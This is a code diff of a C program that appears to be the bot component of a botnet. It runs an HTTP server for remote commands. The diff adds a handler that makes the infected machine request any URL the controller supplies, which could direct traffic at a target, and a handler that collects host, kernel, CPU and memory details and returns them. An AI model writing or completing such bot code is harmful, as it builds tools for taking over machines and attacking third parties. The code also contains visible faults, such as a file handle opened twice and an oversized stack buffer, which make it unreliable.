@@ -5,11 +5,6 @@ char *IP;
 long port = 2324;
 int ret;
 struct MHD_Daemon *mhd_daemon;
-void setBotIP();
-int connectToController();
-int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
-                   const char *method, const char *version, const char *upload_data,
-                   size_t *upload_data_size, void **con_cls);
 
 int main(int argc, char const *argv[])
 {
@@ -116,37 +111,137 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
                    size_t *upload_data_size, void **con_cls)
 {
 
-    const char *msg = "OK";
+    const char *msg = "DONE";
     struct MHD_Response *response;
     int ret;
 
     response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
-    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
+    
 
     char *endpoint;
     endpoint = strstr(url, "/http_req");
-    if(endpoint != NULL){
-        puts("1");
-        // TODO handle http request
+    if (endpoint != NULL)
+    {
+        printf("Sending request...\n");
+        char *request = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, "request");
+        ret = sendRequestToTarget(request);
+
         endpoint = NULL;
     }
 
     endpoint = strstr(url, "/sys_info");
-    if(endpoint != NULL){
-        puts("2");
+    if (endpoint != NULL)
+    {
         // TODO handle sys_info
+        char info[1000000] = {0};
+        ret = sendSystemInfo(info);
+        response = MHD_create_response_from_buffer(strlen(info), (void *)info, MHD_RESPMEM_PERSISTENT);
+
         endpoint = NULL;
     }
 
     endpoint = strstr(url, "/email");
-    if(endpoint != NULL){
-        puts("3");
+    if (endpoint != NULL)
+    {
+
         endpoint = NULL;
     }
 
     // TODO create a method that send a request(response?) to controller in order to notify it that action has been performed, the controller will update the botnet info
-
+    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
     MHD_destroy_response(response);
 
     return ret;
+}
+
+int sendRequestToTarget(const char *request)
+{
+
+    CURL *curl;
+
+    curl = curl_easy_init();
+
+    if (curl == NULL)
+        handle_error("Could not execute command, error initializing curl handle");
+    // curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+    curl_easy_setopt(curl, CURLOPT_URL, request);
+
+    ret = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    return 1;
+}
+
+int sendSystemInfo(char *info)
+{
+
+    struct utsname buff;
+    struct sysinfo si;
+    int i;
+
+    const double megabyte = 1024 * 1024;
+    uname(&buff);
+    sysinfo(&si);
+
+    i = sprintf(info, "NodeName = %s\n", buff.nodename);
+    i += sprintf(info + i, "System OS = %s\n", buff.sysname);
+    i += sprintf(info + i, "Kernel Release = %s\n", buff.release);
+    i += sprintf(info + i, "System Version = %s\n", buff.version);
+    i += sprintf(info + i, "CPU Architecture = %s\n", buff.machine);
+
+    // printf("CPU model = %s\n", );
+
+    FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
+    FILE *file;
+    char line[1024];
+    char modelName[1024];
+    char cpuMhz[1024];
+    char cacheSize[1024];
+    char cores[1024];
+
+    file = fopen("/proc/cpuinfo", "rb");
+
+    if (file == NULL)
+    {
+        printf("Error opening file\n");
+    }
+    else
+    {
+        while (fgets(line, sizeof(line), file))
+        {
+            if (strstr(line, "model name") != NULL)
+            {
+                strcpy(modelName, line);
+                // break;
+            }
+            if (strstr(line, "cpu cores") != NULL)
+            {
+                strcpy(cores, line);
+                // break;
+            }
+            if (strstr(line, "cpu MHz") != NULL)
+            {
+                strcpy(cpuMhz, line);
+                cpuMhz[strcspn(cpuMhz, "\n")] = 0;
+                strcat(cpuMhz, " Mhz\n");
+                // break;
+            }
+            if (strstr(line, "cache size") != NULL)
+            {
+                strcpy(cacheSize, line);
+                // break;
+            }
+        }
+        fclose(file);
+    }
+
+    i += sprintf(info + i, "%s", modelName);
+    i += sprintf(info + i, "%s", cores);
+    i += sprintf(info + i, "%s", cacheSize);
+    i += sprintf(info + i, "%s", cpuMhz);
+
+    i += sprintf(info + i, "Total RAM = %5.lfMB\n", si.totalram / megabyte);
+    i += sprintf(info + i, "Free RAM = %5.lfMB\n", si.freeram / megabyte);
+
+    printf("Sending following info about system: %s", info);
+    return 1;
 }
